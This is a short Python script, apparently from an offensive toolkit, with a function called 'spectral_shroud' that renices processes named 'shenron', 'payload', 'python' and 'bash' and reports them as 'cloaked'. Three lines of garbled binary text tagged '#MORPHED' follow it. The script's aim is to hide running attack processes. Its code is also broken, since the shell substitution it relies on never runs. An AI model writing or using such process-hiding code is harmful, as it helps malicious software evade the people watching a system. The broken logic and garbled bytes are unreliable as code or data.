#!/usr/bin/env python3
import subprocess

def spectral_shroud():
    processes = ["shenron", "payload", "python", "bash"]
    for proc in processes:
        subprocess.run(["pgrep", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["renice", "+10", "-p", "$(pgrep " + proc + ")"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[âœ“] Processes cloaked in spectral shroud.")

if __name__ == "__main__":
    spectral_shroud()

ª-Ò¹§î©Õ“„ªÕ„º	øAþŒÕ*33Ì6óÐ÷ƒciPdÚÀê{#MORPHED

Œß¥h½|fp‚Eë©"Ñ‡èþŸ¬±–SKõ{ºžwö#MORPHED

M.Nyñb„>5G-NW„à–É_¶‚È§¡|âˆõž“Ãx`ÌlÒõ´L0sLÀvrn#MORPHED
